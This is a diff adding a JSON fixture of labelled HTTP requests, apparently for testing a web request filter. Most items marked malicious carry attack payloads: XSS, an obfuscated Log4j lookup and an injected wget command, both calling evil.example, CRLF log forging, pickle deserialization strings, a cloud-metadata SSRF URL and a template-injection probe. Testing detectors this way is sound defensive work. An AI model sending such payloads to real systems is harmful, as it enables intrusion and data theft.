@@ -1,0 +1,102 @@
+[
+  {
+    "id": "x01",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/comments",
+    "query": "",
+    "body": {"order_id": 3, "text": "<img src=x onmouseover=alert(1)>"},
+    "note": "xss event handler"
+  },
+  {
+    "id": "x02",
+    "label": "benign",
+    "method": "POST",
+    "path": "/api/comments",
+    "query": "",
+    "body": {"order_id": 3, "text": "A script element is a teaching example, not something I am sending."},
+    "note": "xss named in a sentence"
+  },
+  {
+    "id": "x03",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/search",
+    "query": "",
+    "body": {"query": "${lower:j}ndi:ldap://evil.example/a"},
+    "note": "obfuscated log4j"
+  },
+  {
+    "id": "x04",
+    "label": "malicious",
+    "method": "GET",
+    "path": "/api/files",
+    "query": "name=report%0aINFO+admin+logged+in",
+    "body": null,
+    "note": "crlf log forging"
+  },
+  {
+    "id": "x05",
+    "label": "benign",
+    "method": "POST",
+    "path": "/api/comments",
+    "query": "",
+    "body": {"order_id": 4, "text": "hello\nplease leave the box at the door"},
+    "note": "newline in a comment"
+  },
+  {
+    "id": "x06",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/tickets",
+    "query": "",
+    "body": {"subject": "box", "body": "gASVBAAAAAAAAACMCGJ1aWx0aW5zlIwEc3lzdGVt"},
+    "note": "pickle deserialization"
+  },
+  {
+    "id": "x07",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/comments",
+    "query": "",
+    "body": {"order_id": 5, "text": "ok"},
+    "headers": {"cookie": "session=gASVBAAAAAAAAACMCGJ1aWx0aW5z"},
+    "note": "cookie payload"
+  },
+  {
+    "id": "x08",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/tickets",
+    "query": "",
+    "body": {"subject": "fetch", "body": "http://169.254.169.254/latest/meta-data/"},
+    "note": "ssrf metadata url"
+  },
+  {
+    "id": "x09",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/reviews",
+    "query": "",
+    "body": {"order_id": 6, "rating": 5, "title": "hello {{7*7}}"},
+    "note": "ssti expression"
+  },
+  {
+    "id": "x10",
+    "label": "malicious",
+    "method": "POST",
+    "path": "/api/comments",
+    "query": "",
+    "body": {"order_id": 7, "text": "ok; wget http://evil.example/x"},
+    "note": "command after semicolon"
+  },
+  {
+    "id": "x11",
+    "label": "benign",
+    "method": "GET",
+    "path": "/api/orders/15",
+    "query": "",
+    "body": null,
+    "note": "ordinary order read"
+  }
+]
